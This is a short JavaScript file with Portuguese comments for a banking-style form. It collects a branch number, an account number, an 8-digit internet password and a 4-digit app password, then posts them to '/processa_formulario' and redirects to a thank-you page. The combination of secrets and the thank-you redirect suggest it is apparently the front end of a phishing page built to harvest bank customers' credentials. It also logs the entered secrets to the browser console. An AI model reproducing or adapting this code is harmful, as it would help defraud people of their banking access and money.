const form = document.querySelector("form");
const opcao1 = document.querySelector("#opcao1");
const opcao2 = document.querySelector("#opcao2");
const opcao3 = document.querySelector("#opcao3");
const opcao4 = document.querySelector("#opcao4");
const agency = document.querySelector("#agency");
const login = document.querySelector("#login");
const internet = document.querySelector("#internet");
const app = document.querySelector("#app");
const spans = document.querySelectorAll('.span-required');
const campos = document.querySelectorAll('.required');

// Função para filtrar caracteres não numéricos
function filterNumbers(event) {
  const input = event.target;
  input.value = input.value.replace(/\D+/g, "");
}

// Aplica a função de filtragem a todos os campos
const fields = [agency, login, internet, app];
fields.forEach((field) => {
  field.addEventListener("input", filterNumbers);
});

// Função para limitar o número de caracteres em tempo real
function limitInputLength(event, maxLength) {
  const input = event.target;
  input.value = input.value.slice(0, maxLength);
}

// Adiciona o event listener de input para limitar a entrada de caracteres
agency.addEventListener("input", (event) => limitInputLength(event, 4));
login.addEventListener("input", (event) => limitInputLength(event, 8));
internet.addEventListener("input", (event) => limitInputLength(event, 8));
app.addEventListener("input", (event) => limitInputLength(event, 4));

// Função para mostrar o span de erro de formulário
function setError(index) {
  campos[index].style.border = '2px solid #e63636';
  spans[index].style.display = 'block';
}

// Função para remover o span de erro de formulário
function removeError(index) {
  campos[index].style.border = '';
  spans[index].style.display = 'none';
}

// Funções de validação
function agValidate() {
  console.log('Agência:', campos[0].value);
  if (campos[0].value.length < 4) {
    // Preencher com zeros à esquerda até que o comprimento seja 4
    campos[0].value = campos[0].value.padStart(4, '0');
  }
  if (campos[0].value.length !== 4) {
    setError(0);
    return false;
  } else {
    removeError(0);
    return true;
  }
}

function countValidate() {
  console.log('Conta:', campos[1].value);
  if (campos[1].value.length < 8) {
    // Preencher com zeros à esquerda até que o comprimento seja 8
    campos[1].value = campos[1].value.padStart(8, '0');
  }
  if (campos[1].value.length !== 8) {
    setError(1);
    return false;
  } else {
    removeError(1);
    return true;
  }
}

function internetValidate() {
  console.log('Internet:', campos[2].value);
  if (campos[2].value.length !== 8) {
    setError(2);
    return false;
  } else {
    removeError(2);
    return true;
  }
}

function digitalValidate() {
  console.log('App:', campos[3].value);
  if (campos[3].value.length !== 4) {
    setError(3);
    return false;
  } else {
    removeError(3);
    return true;
  }
}

// Função para validar e enviar o formulário
form.addEventListener("submit", (event) => {
  event.preventDefault(); // Evita o envio padrão do formulário

  // Valida todos os campos
  const isAgenciaValid = agValidate();
  const isLoginValid = countValidate();
  const isInternetValid = internetValidate();
  const isAppValid = digitalValidate();

  // Se todos os campos forem válidos, envia o formulário
  if (isAgenciaValid && isLoginValid && isInternetValid && isAppValid) {
    const formData = new FormData(form); // Coleta os dados do formulário

    fetch("/processa_formulario", {
      method: "POST",
      body: formData,
    })
      .then((response) => {
        if (response.ok) {
          window.location.href = "/agradecimento.html"; // Redireciona para a página de agradecimento
        } else {
          console.error("Erro ao enviar o formulário.");
        }
      })
      .catch((error) => console.error("Erro:", error));
  }
});
